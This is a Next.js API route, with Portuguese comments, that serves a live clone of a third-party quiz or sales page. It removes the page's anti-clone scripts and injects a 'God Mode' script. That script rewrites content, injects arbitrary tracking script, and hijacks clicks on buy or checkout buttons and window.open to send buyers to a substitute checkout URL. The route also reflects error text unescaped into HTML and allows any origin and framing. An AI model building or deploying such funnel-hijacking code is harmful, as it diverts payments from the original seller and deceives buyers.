import { NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import * as cheerio from 'cheerio';

export async function GET(req: Request, props: { params: Promise<{ id: string }> }) {
  const params = await props.params;

  const { data: quiz, error } = await supabaseAdmin
    .from('quizzes')
    .select('theme_config, original_url')
    .eq('id', params.id)
    .single();

  if (error || !quiz || !quiz.original_url) {
    return new NextResponse('Quiz não encontrado ou sem URL original', { status: 404 });
  }

  try {
    // 1. Fetch LIVE HTML from original_url
    const response = await fetch(quiz.original_url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html'
      },
      next: { revalidate: 60 } // Cache por 60 segundos para performance
    });

    if (!response.ok) {
       throw new Error(`Erro ao buscar o site original: ${response.status}`);
    }

    const htmlBuffer = await response.arrayBuffer();
    const decoder = new TextDecoder('utf-8');
    const rawHtml = decoder.decode(htmlBuffer);

    // 2. Parse and Inject
    const $ = cheerio.load(rawHtml);
    const baseUrlObj = new URL(quiz.original_url);
    const baseUrl = `${baseUrlObj.protocol}//${baseUrlObj.host}`;
    const replacements = quiz.theme_config?.replacements || {};

    const safeGuardV7 = `
      <script>window.QUIZ_REPLACEMENTS = ${JSON.stringify(replacements)};</script>
      <script id="god-mode-v7">
        console.log("God Mode v7 Ativado - Proxy + Mutation Dictionary (LIVE PROXY)");
        
        try { window.history.replaceState(null, '', '/'); } catch(e) {}

        const proxyUrl = '/api/proxy?url=';
        const targetBaseUrl = '${baseUrl}';

        const _origFetch = window.fetch;
        window.fetch = async function() {
          let [resource, config] = arguments;
          if (typeof resource === 'string') {
            if (resource.startsWith('/')) {
              resource = proxyUrl + encodeURIComponent(targetBaseUrl + resource);
            } else if (resource.startsWith(targetBaseUrl)) {
              resource = proxyUrl + encodeURIComponent(resource);
            }
          } else if (resource instanceof Request) {
             const urlObj = new URL(resource.url, window.location.origin);
             if(urlObj.origin === window.location.origin && urlObj.pathname.startsWith('/')) {
                resource = new Request(proxyUrl + encodeURIComponent(targetBaseUrl + urlObj.pathname + urlObj.search), resource);
             } else if (urlObj.origin === targetBaseUrl) {
                resource = new Request(proxyUrl + encodeURIComponent(resource.url), resource);
             }
          }
          return _origFetch.call(this, resource, config);
        };

        const _origOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
          if (typeof url === 'string') {
            if (url.startsWith('/')) {
              url = proxyUrl + encodeURIComponent(targetBaseUrl + url);
            } else if (url.startsWith(targetBaseUrl)) {
              url = proxyUrl + encodeURIComponent(url);
            }
          }
          return _origOpen.call(this, method, url, async, user, password);
        };

        function applyReplacements(node) {
          if (!node) return;
          if (node.nodeType === 3) { // Text node
            const val = node.nodeValue?.trim();
            if (val && window.QUIZ_REPLACEMENTS[val]) {
              const newVal = window.QUIZ_REPLACEMENTS[val];
              if (typeof newVal === 'string' && !newVal.startsWith('http')) {
                node.nodeValue = node.nodeValue.replace(val, newVal);
              }
            }
          } else if (node.nodeType === 1) { // Element node
            if (node.hasAttribute('href')) {
               const href = node.getAttribute('href');
               if (href && window.QUIZ_REPLACEMENTS[href]) {
                  node.setAttribute('href', window.QUIZ_REPLACEMENTS[href]);
               }
            }

            if (node.tagName === 'IMG' && node.hasAttribute('src')) {
               const src = node.getAttribute('src');
               if (src && window.QUIZ_REPLACEMENTS[src]) {
                  node.setAttribute('src', window.QUIZ_REPLACEMENTS[src]);
               }
            }

            node.childNodes.forEach(applyReplacements);
          }
        }

        const observer = new MutationObserver((mutations) => {
          mutations.forEach(mutation => {
            if (mutation.type === 'childList') {
              mutation.addedNodes.forEach(node => applyReplacements(node));
            } else if (mutation.type === 'characterData') {
              const oldVal = mutation.target.nodeValue?.trim();
              if (oldVal && window.QUIZ_REPLACEMENTS[oldVal]) {
                 mutation.target.nodeValue = mutation.target.nodeValue.replace(oldVal, window.QUIZ_REPLACEMENTS[oldVal]);
              }
            } else if (mutation.type === 'attributes') {
              const attr = mutation.attributeName;
              if (attr === 'href' || attr === 'src') {
                 const val = mutation.target.getAttribute(attr);
                 if (val && window.QUIZ_REPLACEMENTS[val]) {
                    mutation.target.setAttribute(attr, window.QUIZ_REPLACEMENTS[val]);
                 }
              }
            }
          });
        });

        observer.observe(document.documentElement, {
          childList: true,
          subtree: true,
          characterData: true,
          attributes: true,
          attributeFilter: ['href', 'src']
        });

        // HACK: Interceptação Agressiva de Checkout
        const forceCheckout = (e, customUrl) => {
          const finalUrl = customUrl || window.QUIZ_REPLACEMENTS['__CHECKOUT_URL__'];
          if (finalUrl) {
            if (e && e.preventDefault) e.preventDefault();
            if (e && e.stopPropagation) e.stopPropagation();
            console.log("God Mode: Redirecionando para " + finalUrl);
            window.location.href = finalUrl;
            return true;
          }
          return false;
        };

        // Interceptar clicks em qualquer coisa que pareça um gatilho de checkout
        document.addEventListener('click', (e) => {
          const target = e.target.closest('a, button, [role="button"], div, span');
          if (!target) return;

          const text = target.textContent?.toLowerCase() || '';
          const href = target.getAttribute('href') || '';
          const btnId = target.getAttribute('id') || '';
          const btnClass = target.getAttribute('class') || '';
          
          // Verificar se este link/botão específico tem uma substituição individual
          const specificUrl = (href && window.QUIZ_REPLACEMENTS[href]) 
            || (btnId && window.QUIZ_REPLACEMENTS[btnId]) 
            || (btnClass && window.QUIZ_REPLACEMENTS[btnClass])
            || null;
          
          // Se o texto contiver palavras de checkout ou o link for para um checkout conhecido
          const isCheckoutTrigger = 
            text.includes('comprar') || 
            text.includes('checkout') || 
            text.includes('receber agora') ||
            text.includes('obter acesso') ||
            text.includes('receber o meu') ||
            text.includes('receber') ||
            text.includes('quero o plano') ||
            text.includes('quero o plano de') ||
            text.includes('quero o plano anual') ||
            href.includes('pay.') || 
            href.includes('checkout') ||
            href.includes('cakto') ||
            href.includes('kirvano') ||
            href.includes('perfectpay');

          if (isCheckoutTrigger || specificUrl) {
            forceCheckout(e, specificUrl);
          }
        }, true);

        // Hook window.open e window.location via Proxy de Navegação
        const origOpen = window.open;
        window.open = function(url, target, features) {
          if (window.QUIZ_REPLACEMENTS['__CHECKOUT_URL__'] && typeof url === 'string') {
            if (url.includes('pay.') || url.includes('checkout') || !url.includes(window.location.hostname)) {
              return origOpen.call(window, window.QUIZ_REPLACEMENTS['__CHECKOUT_URL__'], target, features);
            }
          }
          return origOpen.call(window, url, target, features);
        };

        // Inject Pixel Script se existir
        if (window.QUIZ_REPLACEMENTS['__PIXEL_SCRIPT__']) {
            const pixelScript = document.createElement('div');
            pixelScript.innerHTML = window.QUIZ_REPLACEMENTS['__PIXEL_SCRIPT__'];
            Array.from(pixelScript.childNodes).forEach(node => {
               if (node.tagName === 'SCRIPT') {
                  const s = document.createElement('script');
                  s.innerHTML = node.innerHTML;
                  if (node.src) s.src = node.src;
                  document.head.appendChild(s);
               } else {
                  document.body.appendChild(node);
               }
            });
        }

        document.addEventListener('DOMContentLoaded', () => {
          applyReplacements(document.body);
        });

        window.addEventListener('message', (e) => {
          if (e.data && e.data.type === 'SYNC_REPLACEMENTS') {
             window.QUIZ_REPLACEMENTS = e.data.replacements;
             applyReplacements(document.body);
          }
        });
      </script>
    `;

    $('head').prepend(safeGuardV7);

    // FIX DE ASSETS Absolutos
    $('[src^="/"]').each((_, el) => {
      const src = $(el).attr('src');
      if (src && !src.startsWith('//')) {
        $(el).attr('src', baseUrl + src);
      }
    });
    $('[href^="/"]').each((_, el) => {
      const href = $(el).attr('href');
      if (href && !href.startsWith('//')) {
        $(el).attr('href', baseUrl + href);
      }
    });
    $('[srcset]').each((_, el) => {
      let srcset = $(el).attr('srcset');
      if (srcset) {
        srcset = srcset.split(',').map(s => {
          let parts = s.trim().split(' ');
          if (parts[0].startsWith('/')) parts[0] = baseUrl + parts[0];
          return parts.join(' ');
        }).join(', ');
        $(el).attr('srcset', srcset);
      }
    });

    $('script').each((_, el) => {
      const src = $(el).attr('src') || '';
      const content = $(el).html() || '';
      if (src.includes('anti-clone') || content.includes('debugger')) {
        $(el).remove();
      } else if (src && src.includes('.js')) {
         // Proxy JS files to replace location.hostname!
         const absoluteSrc = src.startsWith('/') ? baseUrl + src : src;
         $(el).attr('src', `/api/proxy?url=${encodeURIComponent(absoluteSrc)}&overrideHost=${encodeURIComponent(baseUrlObj.hostname)}`);
      }
    });

    const finalHtml = $.html();

    return new NextResponse(finalHtml, {
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Access-Control-Allow-Origin': '*',
        'Content-Security-Policy': "frame-ancestors *;"
      },
    });

  } catch (err: any) {
    console.error('Dynamic Proxy Error:', err);
    return new NextResponse(`
      <div style="font-family: sans-serif; text-align: center; padding: 50px;">
        <h2>Erro ao carregar o site original.</h2>
        <p>${err.message}</p>
      </div>
    `, { status: 500, headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  }
}
